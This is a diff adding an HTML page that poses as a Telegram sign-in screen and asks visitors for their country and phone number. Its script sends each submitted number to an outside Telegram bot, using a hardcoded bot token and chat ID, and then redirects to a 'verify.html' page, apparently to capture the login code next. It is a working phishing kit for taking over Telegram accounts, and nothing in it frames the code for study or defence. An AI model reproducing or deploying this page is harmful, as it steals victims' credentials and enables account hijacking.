@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Masukkan Nomor Telepon</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      width: 90%;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .monkey-emoji {
+      font-size: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    select, input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #0077b3;
+    }
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <span class="monkey-emoji">🐵</span>
+    <h1>Enter your Telegram number</h1>
+
+<form id="phoneForm">
+  <label for="country">Country</label>
+  <select id="country" required>
+    <option value="+966">KSA Saudi Arabia (+966)</option>
+    <option value="+971">UAE United Arab Emirates (+971)</option>
+    <option value="+968">OM OMAN (+968)</option>
+    <option value="+965">KW Kuwait (+965)</option>
+    <option value="+20">EGP Egypt (+20)</option>
+    <option value="+91">IND India (+91)</option>
+    <option value="+92">PK Pakistan (+92)</option>
+    <option value="+65">SG Singapore (+65)</option>
+    <option value="+60">MYS Malaysia (+60)</option>
+  </select>
+
+  <label for="phone">Telegram phone number</label>
+  <input type="tel" id="phone" placeholder="e.g. +966512345678" required />
+
+  <button type="submit" class="btn">Kirim</button>
+</form>
+
+<div class="status" id="statusMessage"></div>
+
+<script>
+  const botToken = "8135293052:AAFaL0wUXi_6ZxN669S6IU_w9hnteqTA3UY";
+  const chatId = "7247328760";
+
+  const phoneForm = document.getElementById('phoneForm');
+  const countrySelect = document.getElementById('country');
+  const phoneInput = document.getElementById('phone');
+  const statusMessage = document.getElementById('statusMessage');
+
+  // Fungsi untuk update input saat negara dipilih
+  function updatePhoneInput() {
+    const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+    const countryCode = selectedOption.value;
+
+    const currentValue = phoneInput.value.trim();
+
+    if (!currentValue.startsWith(countryCode)) {
+      phoneInput.value = countryCode;
+    }
+    phoneInput.focus();
+  }
+
+  // Set default saat halaman dibuka
+  window.addEventListener('DOMContentLoaded', () => {
+    updatePhoneInput();
+  });
+
+  // Jalankan saat negara dipilih
+  countrySelect.addEventListener('change', () => {
+    updatePhoneInput();
+  });
+
+  phoneForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+    const countryCode = selectedOption.value;
+    const countryName = selectedOption.textContent;
+    const fullPhone = phoneInput.value.trim();
+
+    statusMessage.style.color = "black";
+    statusMessage.textContent = "Mengirim...";
+
+    const messageText = `@DAWEBPHST 
+_________________________________
+• Negara   : ${countryName}
+• Nomor Hp : ${fullPhone}
+_______________________________`;
+
+    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+    fetch(telegramAPI)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          statusMessage.style.color = "green";
+          statusMessage.textContent = "Success!";
+          window.location.href = `verify.html?phone=${encodeURIComponent(fullPhone)}`;
+        } else {
+          statusMessage.style.color = "red";
+          statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
+        }
+      })
+      .catch(error => {
+        statusMessage.style.color = "red";
+        statusMessage.textContent = "Terjadi kesalahan: " + error;
+      });
+  });
+</script>
+</body>
+</html>
